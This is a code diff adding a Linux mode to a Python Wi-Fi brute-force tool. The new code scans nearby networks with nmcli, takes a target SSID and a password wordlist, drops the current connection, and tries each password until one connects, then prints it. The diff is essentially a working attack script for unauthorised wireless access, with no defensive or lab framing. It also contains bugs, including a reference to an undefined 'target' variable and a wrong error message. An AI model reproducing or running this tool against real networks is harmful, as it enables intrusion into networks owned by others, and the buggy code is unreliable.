@@ -10,7 +10,7 @@ if os_name == 'Windows':
         import pywifi
         from pywifi import const
     except ImportError:
-        print("[-] pywifi Package not found")
+        print("[-] pywifi Package not found please install the package using (pip isntall pywifi)")
 elif os_name in ['Linux', 'darwin']:
     os.system('clear')
     if os_name == 'Linux':
@@ -265,7 +265,207 @@ if os_name == 'Windows':
                 print("[-] invalid TypeError")
 
 
+elif os_name == 'Linux':
+    # Linux Code
+    wifi_adapter = None
+    wordlist = None
+    SSID_TARGET = None
+    Current_Network_Usage = None
+    def get_menu():
+        return f"""
+            wifi interface: {wifi_adapter}                            
 
+        1. Wordlist({wordlist})
+        2. Select SSID/TARGET ({SSID_TARGET}) NETWORK
+        3. Scan
+        4. Connect/Attack
+        5. Menu
+        6. Exit
+
+            [00] Choose Network Adapter
+"""
+    
+    def nmcli_scan():
+        scan_networks = subprocess.run(['nmcli', 'device', 'wifi', 'list'], capture_output=True, text=True)
+        print(scan_networks.stdout)
+
+    def list_adapters():
+        global wifi_adapter
+        List_Current_adapters = subprocess.run(['ip', '-o', 'link', 'show'], capture_output=True, text=True)
+        interfaces = []
+
+        for line in List_Current_adapters.stdout.splitlines():
+            name = line.split(": ")[1].split("@")[0]
+            interfaces.append(name)
+        print(interfaces)
+        
+        print("[=] Enter Current Wifi Card/Adapter , wlp, wlan ...")
+        wifi_adapter_temp = input("~$ ")
+        if wifi_adapter_temp not in interfaces:
+            print('[-] Device Is not Avaliable, Check if there is a Typo.')
+            return
+
+        print('[+] Device Found.')
+        wifi_adapter = wifi_adapter_temp
+
+    def wordlist_listing():
+        global wordlist  # Declare wordlist as global
+        path = input("Enter full file path: ").strip().strip('"')
+        path = os.path.expanduser(path)             # allow ~/foo style
+        path = os.path.abspath(path)                # normalise
+        if os.path.isfile(path):
+            print("[+] Found file:", path)
+            wordlist = path  # Now this will modify the global variable
+            time.sleep(0.5)
+            os.system("clear")  
+            print(get_menu())
+            return path
+        else:
+            print("[-] Failed to find file. Check path and permissions.")
+            return None
+
+    def Current_Network():
+        global Current_Network_Usage    
+
+        Current_Network_Usage = subprocess.check_output(
+        ["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"],
+        text=True
+        )
+
+        ssid = None
+        for line in Current_Network_Usage.splitlines():
+            if line.startswith("yes:"):
+                ssid = line.split(":", 1)[1]
+                break
+            
+        if ssid is not None:
+            print(f"[+] Currently Using {ssid} Network.")
+            Current_Network_Usage = ssid
+        else:
+            print(f"[+] Currently Not using a Network. (OFFLINE MODE)")
+
+    def Select_ssid_nmcli():
+        global SSID_TARGET
+        
+        Current_Networks = subprocess.run(['nmcli', '-t', '-f', 'SSID', 'device', 'wifi', 'list'], capture_output=True, text=True)
+        User_Input = input ("Enter Network SSID~$ ").strip()
+
+        ssids = Current_Networks.stdout.splitlines()
+        
+        if User_Input not in ssids:
+            print("[-] Network Not Found.")
+            return
+
+        print("[+] Network Found.")
+        SSID_TARGET = User_Input
+        print("[+] SSID Network Saved.")
+
+    def Connect_To_SSID_Attack():
+        global wordlist
+        global SSID_TARGET
+
+        if wordlist == None:
+            print("[-] Please Enter a Wordlist to begin this operation.")
+            return
+        elif SSID_TARGET == None:
+            print("[-] Please Enter a Wordlist to begin this operation.")
+            return
+        elif Current_Network_Usage == None:
+            print("[+] Starting this operation in offline mode.")
+
+        print(f"\n🔓 Starting brute-force attack on: {target}")
+        print(f"📄 Using wordlist: {wordlist}")
+        print("-" * 50)
+        
+        attempt_count = 0
+        try:
+
+            if Current_Network_Usage is not None:
+                result = subprocess.run(['nmcli', 'c', 'down', Current_Network_Usage], capture_output=True, text=True)
+                if result.returncode == 0:
+                    print(f"[+] Disconnected from {Current_Network_Usage}")
+                else:
+                    print(f"[-] Failed: {result.stderr.strip()}")
+                    return
+            else:
+                print("[+] No active connection to disconnect")
+            
+
+            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+                for password_line in f:
+                    password = password_line.strip()  # Remove newline and whitespace
+                            
+                    if not password:  # Skip empty lines
+                        continue
+
+
+                        
+                    attempt_count += 1
+                    print(f"[Attempt {attempt_count}] Trying password: {password}")
+
+                    try:
+                    
+                        cmd = [
+                        "nmcli", "device", "wifi", "connect", SSID_TARGET,
+                        "password", password
+                        ]   
+
+                        res = subprocess.run(cmd, capture_output=True, text=True)
+                        
+                        print('=' * 40)
+                        print("returncode:", res.returncode)
+                        print("stdout:", res.stdout.strip())
+                        print("stderr:", res.stderr.strip())
+                        print('=' * 40)
+                        print('\n'*2)
+                        if res.returncode == 0:
+                            print("[+] Connected (nmcli reported success).")
+                            print(f"[+] Network: {SSID_TARGET}, Password: {password}")
+                            break
+                        else:
+                            print("Invaild Password. Not connected.")
+                            continue
+                    
+                    except Exception as e:
+                        print(f"[-] A Critical Error Has Accured While Connecting. : {e}")
+            print(f"[!] Finished wordlist on {SSID_TARGET} And Still Didnt Crack the Password.")
+            
+
+        except PermissionError:
+                print(f"[!] You must run this script with root/administrator privileges.")
+                return
+        except Exception as e:
+            print(f"[-] A Critical Error Has occured: {e}")
+
+    
+    def Linux_Boot():
+        if os.geteuid() != 0:
+            exit("[!] You need to have root privileges to run this script.\n[-] Please try again, this time using 'sudo'.\n Exiting.")
+        global wifi_adapter
+        try:
+            Current_Network()
+            print(get_menu())
+            while True:
+                User_interface_input = input("BruteForcer_Linux~$ ")
+                if User_interface_input in ['1','2','3','4','5','6','00']:
+                    if User_interface_input == '1':
+                        wordlist_listing()
+                    elif User_interface_input == '2':
+                        Select_ssid_nmcli()
+                    elif User_interface_input == '3':
+                        nmcli_scan()
+                    elif User_interface_input == '4':
+                        Connect_To_SSID_Attack()
+                    elif User_interface_input == '5':
+                        print(get_menu())
+                    elif User_interface_input == '6':
+                        return
+                    elif User_interface_input == '00':
+                        list_adapters()
+                else:
+                    print('[-] Invalid Input.')
+        except Exception as e:
+            print(f"[-] an error has Accured: {e}")
 
 
 
@@ -273,8 +473,7 @@ def Main():
     if os_name == 'Windows':
         Windows_Boot()
     elif os_name == 'Linux':
-        print("[-] os not supported yet")
-        pass
+        Linux_Boot()
     elif os_name == 'Darwin':
         print("[-] os not supported yet")
         pass
@@ -282,4 +481,5 @@ def Main():
         print("[-] os not supported.")
         pass
 
-# Main() # for testing this code is not offically finished
+
+Main()
